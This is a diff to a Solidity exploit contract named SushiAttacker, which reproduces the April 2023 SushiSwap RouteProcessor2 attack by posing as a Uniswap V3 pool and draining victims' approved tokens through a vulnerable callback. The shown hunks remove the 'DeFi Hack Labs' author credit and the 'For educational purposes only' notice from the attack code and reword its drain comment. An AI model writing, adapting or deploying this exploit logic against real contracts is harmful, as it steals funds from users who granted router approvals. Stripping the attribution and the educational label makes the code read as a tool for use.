@@ -6,7 +6,6 @@ import {IRouteProcessor2} from "./interfaces/IRouteProcessor2.sol";
 
 /**
  * @title SushiAttacker
- * @author DeFi Hack Labs
  * @notice Malicious contract that exploits RouteProcessor2 vulnerability by impersonating a Uniswap V3 pool
  * @dev This contract demonstrates the attack vector used in the April 2023 SushiSwap exploit.
  *      It combines fake pool implementation with exploit logic in a single contract.
@@ -75,7 +74,6 @@ contract SushiAttacker {
      *      4. Router calls this contract's swap() function
      *      5. swap() calls back to router's vulnerable callback
      *      6. Callback executes transferFrom(victim, attacker, amount)
-     * @custom:security Only callable by owner. For educational purposes only.
      */
     function exploit(address _token, address _victim) external {
         require(msg.sender == owner, "Not owner");
@@ -86,7 +84,7 @@ contract SushiAttacker {
         // Auto-detect approval amount
         uint256 approved = IERC20(_token).allowance(_victim, address(router));
 
-        // Drain minimum of balance and approved amount
+        // Set drain amount to extract most allowed amount
         uint256 drainAmount = balance <= approved ? balance : approved;
 
         // Store exploit params for callback
